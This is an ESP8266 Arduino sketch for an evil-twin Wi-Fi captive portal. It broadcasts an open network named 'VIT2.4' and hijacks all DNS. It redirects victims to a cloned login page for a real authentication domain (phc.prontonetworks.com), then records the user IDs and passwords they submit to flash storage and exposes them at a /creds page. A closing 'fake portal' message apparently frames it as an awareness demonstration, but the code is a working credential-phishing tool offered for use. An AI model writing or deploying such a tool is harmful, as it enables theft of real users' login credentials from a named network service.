#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <LittleFS.h>

#define SSID_NAME "VIT2.4"
#define SUBTITLE "Or so it seems..."
#define POST_TITLE "THIS WAS A FAKE PORTAL, FOOLED YOU!"
#define POST_BODY "Please be aware of such fake portal in future</br>Thank you."
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"
#define TARGET_DOMAIN "phc.prontonetworks.com"
#define TARGET_PATH "/cgi-bin/authlogin"

void readData();
void writeData(String data);
void deleteData();

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1);  

String data = "";
String Credentials = "";
int savedData = 0;
int timer = 5000;
int i = 0;
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String header(String title) {
  return "<!DOCTYPE html><html><head><title>" + String(SSID_NAME) + " :: " + title + 
         "</title><meta name=viewport content=\"width=device-width,initial-scale=1\">" +
         "<link href=\"/css.css\" rel=\"stylesheet\"></head><body>" +
         "<nav><b>" + String(SSID_NAME) + "</b> " + SUBTITLE + "</nav>" +
         "<div><h1>" + title + "</h1></div><div>";
}

String footer() { 
  return "</div><div class=\"footer\"><a>&#169; All rights reserved.</a></div></body></html>";
}

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center>" +
         "<p><a href=/>Back to Index</a></p><p><a href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return serveHtmlFromLittleFS();
}

String serveHtmlFromLittleFS() {
  if (LittleFS.exists("/Pronto Authentication.html")) {
    File file = LittleFS.open("/Pronto Authentication.html", "r");
    String content = file.readString();
    file.close();
    return content;
  } else {
    return "Error: HTML file not found";
  }
}

String posted() {
  String userId = input("userId");
  String password = input("password");
  readData();
  Credentials = data + "<li>User ID: <b>" + userId + "</b></br>Password: <b>" + password + "</b></li>";
  data = Credentials;
  writeData(data);
  savedData = 1;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  Credentials = "<p></p>";
  data = "";
  savedData = 0;
  deleteData();
  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p>" +
         "<center><a href=/>Back to Index</a></center>" + footer();
}

void BLINK() {
  int count = 0;
  while (count < 5) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(500);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(500);
    count = count + 1;
  }
}

void readData() {
  File file = LittleFS.open("/SavedFile.txt", "r");
  if (!file) {
    return;
  }
  data = ""; 
  int i = 0;
  char myArray[1000];
  while (file.available()) {

    myArray[i] = (file.read()); 
    i++;
  }
  myArray[i] = '\0';  
  file.close();
  data = String(myArray);  
  if (data != ""){
    savedData=1;
  }
}

void writeData(String data) {
  File file = LittleFS.open("/SavedFile.txt", "w");
  file.print(data);
  delay(1);
  file.close();
}

void deleteData() {
  LittleFS.remove("/SavedFile.txt");
}

String getContentType(String filename) {
  if (filename.endsWith(".html")) return "text/html";
  else if (filename.endsWith(".css")) return "text/css";
  else if (filename.endsWith(".js")) return "application/javascript";
  else if (filename.endsWith(".ico")) return "image/x-icon";
  else if (filename.endsWith(".jpg") || filename.endsWith(".jpeg")) return "image/jpeg";
  else if (filename.endsWith(".png")) return "image/png";
  else if (filename.endsWith(".gif")) return "image/gif";
  return "text/plain";
}

bool handleFileRead(String path) {
  Serial.println("handleFileRead: " + path);
  
  if (path.endsWith("/")) path += "index.html";
  
  String contentType = getContentType(path);
  
  if (LittleFS.exists(path)) {
    File file = LittleFS.open(path, "r");
    webServer.streamFile(file, contentType);
    file.close();
    return true;
  }
  Serial.println("\tFile Not Found: " + path);
  return false;
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", APIP);
  
  webServer.on(TARGET_PATH, []() {
    if (webServer.method() == HTTP_POST) {
      webServer.send(HTTP_CODE, "text/html", posted());
      BLINK();
    } else {
      webServer.send(HTTP_CODE, "text/html", index());
    }
  });
  
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  
  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });

  webServer.onNotFound([]() {
    lastActivity = millis();
    
    String host = webServer.hostHeader();
    
    if (host.equals(TARGET_DOMAIN)) {
      String requestedPath = webServer.uri();
      if (handleFileRead(requestedPath)) {
        return;
      }
      webServer.send(HTTP_CODE, "text/html", index());
    } else {
      String redirectUrl = "http://" + String(TARGET_DOMAIN) + String(TARGET_PATH);
      webServer.sendHeader("Location", redirectUrl, true);
      webServer.send(302, "text/plain", "");
    }
  });
  
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  Serial.begin(115200);

  if (!LittleFS.begin()) {
    Serial.println("An Error has occurred while mounting LittleFS");
    delay(1000);
    return;
  }
  readData();
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) { lastTick = millis(); }
  dnsServer.processNextRequest();
  webServer.handleClient();
  i++;
  Serial.println(i);
  Serial.println(savedData);
  if (i == timer && savedData == 1) {
    i = 0;
    digitalWrite(LED_BUILTIN, LOW);
    delay(50);
    digitalWrite(LED_BUILTIN, HIGH);
  }
  if (i > timer) { i = 0; }
}